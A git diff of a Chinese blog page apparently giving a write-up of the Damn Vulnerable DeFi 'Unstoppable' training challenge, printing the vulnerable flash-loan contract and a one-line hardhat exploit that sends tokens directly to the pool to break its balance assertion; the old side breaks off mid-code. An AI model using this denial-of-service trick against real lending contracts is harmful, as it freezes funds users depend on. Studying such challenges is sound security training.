@@ -1,24 +1,21 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"mouke180.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Yuki">
+  <meta name="keywords" content="">
+  
     <meta name="description" content="Damn Vulnerable Defi Unstoppable wp1.代码分析Unstoppable 题目要求我们阻止借贷池子继续向用户借钱，这道题给了我们两个合约，一个是 ReceiverUnstoppable.sol 合约，一个是 UnstoppableLender.sol 合约，我们先看 UnstoppableLender.sol 合约。 UnstoppableLender.sol123">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Unstoppable">
@@ -29,266 +26,588 @@
 <meta property="article:published_time" content="2022-11-26T13:26:17.000Z">
 <meta property="article:modified_time" content="2022-11-28T12:30:11.082Z">
 <meta property="article:author" content="Yuki">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Unstoppable - Yuki&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<link rel="canonical" href="https://mouke180.github.io/2022/11/26/Unstoppable/">
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mouke180.github.io/2022/11/26/Unstoppable/","path":"2022/11/26/Unstoppable/","title":"Unstoppable"}</script>
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
 
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Unstoppable | Yuki's Blog</title>
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
 
 
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mouke180.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
 
 
-  <script async defer data-website-id="" src=""></script>
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
 
-  <script defer data-domain="" src=""></script>
 
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
+<body>
+  
 
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
+  <header>
+    
 
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">Yuki's Blog</p>
-      <i class="logo-line"></i>
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
     </a>
-      <p class="site-subtitle" itemprop="description">Love zhu</p>
-  </div>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section">首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section">分类</a></li><li class="menu-item menu-item-catalogue"><a href="/catalogues/" rel="section">目录</a></li>
-  </ul>
 </nav>
 
-
-
-
-</header>
-        
   
-  <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Damn-Vulnerable-Defi-Unstoppable-wp"><span class="nav-number">1.</span> <span class="nav-text">Damn Vulnerable Defi Unstoppable wp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">1.代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#UnstoppableLender-sol"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">UnstoppableLender.sol</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">2.攻击</span></a></li></ol></li></ol></div>
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Unstoppable"></span>
+          
         </div>
-        <!--/noindex-->
 
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">Yuki</p>
-  <div class="site-description" itemprop="description">Happy Everyday</div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">6</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-26 21:26" pubdate>
+          2022年11月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
       </div>
-      <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">2</span>
-        <span class="site-state-item-name">标签</span>
-      </div>
-  </nav>
+
+      
+    </div>
+  </div>
 </div>
 
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Unstoppable</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Damn-Vulnerable-Defi-Unstoppable-wp"><a href="#Damn-Vulnerable-Defi-Unstoppable-wp" class="headerlink" title="Damn Vulnerable Defi Unstoppable wp"></a>Damn Vulnerable Defi Unstoppable wp</h2><h3 id="1-代码分析"><a href="#1-代码分析" class="headerlink" title="1.代码分析"></a>1.代码分析</h3><p>Unstoppable 题目要求我们阻止借贷池子继续向用户借钱，这道题给了我们两个合约，一个是 ReceiverUnstoppable.sol 合约，一个是 UnstoppableLender.sol 合约，我们先看 UnstoppableLender.sol 合约。</p>
+<h5 id="UnstoppableLender-sol"><a href="#UnstoppableLender-sol" class="headerlink" title="UnstoppableLender.sol"></a>UnstoppableLender.sol</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;<br><br>interface <span class="hljs-title class_">IReceiver</span> &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">receiveTokens</span>(<span class="hljs-params">address tokenAddress, uint256 amount</span>) external;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@title</span> <span class="hljs-variable">UnstoppableLender</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="hljs-comment"> */</span><br>contract <span class="hljs-title class_">UnstoppableLender</span> is <span class="hljs-title class_">ReentrancyGuard</span> &#123;<br><br>    <span class="hljs-title class_">IERC20</span> public immutable damnValuableToken;<br>    uint256 public poolBalance;<br><br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address tokenAddress</span>) &#123;<br>        <span class="hljs-built_in">require</span>(tokenAddress != <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;Token address cannot be zero&quot;</span>);<br>        damnValuableToken = <span class="hljs-title class_">IERC20</span>(tokenAddress);<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">depositTokens</span>(<span class="hljs-params">uint256 amount</span>) external nonReentrant &#123;<br>        <span class="hljs-built_in">require</span>(amount &gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Must deposit at least one token&quot;</span>);<br>        <span class="hljs-comment">// Transfer token from sender. Sender must have first approved them.</span><br>        damnValuableToken.<span class="hljs-title function_">transferFrom</span>(msg.<span class="hljs-property">sender</span>, <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), amount);<br>        poolBalance = poolBalance + amount;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">flashLoan</span>(<span class="hljs-params">uint256 borrowAmount</span>) external nonReentrant &#123;<br>        <span class="hljs-built_in">require</span>(borrowAmount &gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Must borrow at least one token&quot;</span>);<br><br>        uint256 balanceBefore = damnValuableToken.<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>));<br>        <span class="hljs-built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="hljs-string">&quot;Not enough tokens in pool&quot;</span>);<br><br>        <span class="hljs-comment">// Ensured by the protocol via the `depositTokens` function</span><br>        <span class="hljs-title function_">assert</span>(poolBalance == balanceBefore);<br>        <br>        damnValuableToken.<span class="hljs-title function_">transfer</span>(msg.<span class="hljs-property">sender</span>, borrowAmount);<br>        <br>        <span class="hljs-title class_">IReceiver</span>(msg.<span class="hljs-property">sender</span>).<span class="hljs-title function_">receiveTokens</span>(<span class="hljs-title function_">address</span>(damnValuableToken), borrowAmount);<br>        <br>        uint256 balanceAfter = damnValuableToken.<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>));<br>        <span class="hljs-built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="hljs-string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>合约的结构很简单，只有两个函数，一个是 depositTokens 函数，一个是 flashLoan 函数，depositTokens 函数的功能是用户存钱到借贷合约，flashLoan 函数的功能是给用户借钱，我们主要看 flashLoan 函数。</p>
+<p>flashLoan 函数中有一行特别的判断：<br><code>assert(poolBalance == balanceBefore);</code><br>要求 poolBalance 变量等于 balanceBerfore 变量，poolBalance 变量只有在调用 depositTokens 函数的时候才会增加，而 balanceBefore 是用户借钱时借贷池子的金额，所以我们可以直接向合约转账，这样 poolBalance 的值不变，balanceBefore 的值会增加，这个判断就通过不了，我们就可以阻止这个池子继续提供贷款。</p>
+<h3 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2.攻击"></a>2.攻击</h3><p>我们直接向 UnstoppableLender 合约转任意金额，然后用 hardhat 测试就可以了，攻击代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span>.<span class="hljs-title function_">transfer</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-property">address</span>,<span class="hljs-number">1</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Unstoppable</div>
+      <div>https://mouke180.github.io/2022/11/26/Unstoppable/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Yuki</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/28/Lotteries/" title="Lotteries">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Lotteries</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
         </div>
       </div>
     </div>
 
-    
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
   </aside>
 
 
     </div>
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mouke180.github.io/2022/11/26/Unstoppable/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yuki">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yuki's Blog">
-      <meta itemprop="description" content="Happy Everyday">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Unstoppable | Yuki's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          Unstoppable
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-11-26 21:26:17" itemprop="dateCreated datePublished" datetime="2022-11-26T21:26:17+08:00">2022-11-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-11-28 20:30:11" itemprop="dateModified" datetime="2022-11-28T20:30:11+08:00">2022-11-28</time>
-    </span>
-
-  
+  </div>
 </div>
 
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
         </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <h2 id="Damn-Vulnerable-Defi-Unstoppable-wp"><a href="#Damn-Vulnerable-Defi-Unstoppable-wp" class="headerlink" title="Damn Vulnerable Defi Unstoppable wp"></a>Damn Vulnerable Defi Unstoppable wp</h2><h3 id="1-代码分析"><a href="#1-代码分析" class="headerlink" title="1.代码分析"></a>1.代码分析</h3><p>Unstoppable 题目要求我们阻止借贷池子继续向用户借钱，这道题给了我们两个合约，一个是 ReceiverUnstoppable.sol 合约，一个是 UnstoppableLender.sol 合约，我们先看 UnstoppableLender.sol 合约。</p>
-<h5 id="UnstoppableLender-sol"><a href="#UnstoppableLender-sol" class="headerlink" title="UnstoppableLender.sol"></a>UnstoppableLender.sol</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveTokens</span>(<span class="params">address tokenAddress, uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">UnstoppableLender</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">UnstoppableLender</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">IERC20</span> public immutable damnValuableToken;</span><br><span class="line">    uint256 public poolBalance;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddress</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(tokenAddress != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Token address cannot be zero&quot;</span>);</span><br><span class="line">        damnValuableToken = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">depositTokens</span>(<span class="params">uint256 amount</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>, <span class="string">&quot;Must deposit at least one token&quot;</span>);</span><br><span class="line">        <span class="comment">// Transfer token from sender. Sender must have first approved them.</span></span><br><span class="line">        damnValuableToken.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">        poolBalance = poolBalance + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 borrowAmount</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(borrowAmount &gt; <span class="number">0</span>, <span class="string">&quot;Must borrow at least one token&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough tokens in pool&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Ensured by the protocol via the `depositTokens` function</span></span><br><span class="line">        <span class="title function_">assert</span>(poolBalance == balanceBefore);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">IReceiver</span>(msg.<span class="property">sender</span>).<span class="title function_">receiveTokens</span>(<span class="title function_">address</span>(damnValuableToken), borrowAmount);</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 